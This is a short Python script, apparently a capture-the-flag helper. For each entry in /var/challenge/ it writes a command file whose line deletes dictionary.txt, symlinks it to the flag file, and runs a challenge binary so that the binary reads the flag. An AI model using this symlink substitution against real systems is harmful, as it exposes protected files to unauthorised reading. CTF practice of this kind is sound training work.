import os
with os.scandir("/var/challenge/") as dirFiles:
  for dirFile in dirFiles:
    f = open(dirFile.name + "_crash_commands.txt", "w")
    f.write("rm dictionary.txt; ln -s flag dictionary.txt; timeout 2s $i/dict -p flag")
    f.close()
